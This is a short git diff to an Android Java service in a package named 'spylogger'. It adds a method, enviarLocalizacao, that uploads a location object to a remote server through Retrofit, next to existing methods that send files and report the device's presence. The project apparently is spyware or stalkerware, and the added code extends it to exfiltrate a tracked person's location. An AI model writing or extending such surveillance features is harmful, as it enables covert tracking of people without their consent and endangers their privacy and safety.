@@ -2,6 +2,7 @@ package com.gravatasufoca.spylogger.services;
 
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;
+import com.gravatasufoca.spylogger.vos.LocalizacaoVO;
 
 import retrofit2.Call;
 
@@ -19,6 +20,12 @@ public class SendArquivoService extends SendDataService<Boolean> {
         Call<Boolean> call=sendApi.enviarArquivo(envioArquivoVO);
         call.enqueue(this);
     }
+
+    public void enviarLocalizacao(LocalizacaoVO envioArquivoVO){
+        Call<Boolean> call=sendApi.enviarLocalizacao(envioArquivoVO);
+        call.enqueue(this);
+    }
+
     public void notificarExistencia(EnvioArquivoVO envioArquivoVO){
         Call<Boolean> call=sendApi.notificarExistencia(envioArquivoVO);
         call.enqueue(this);
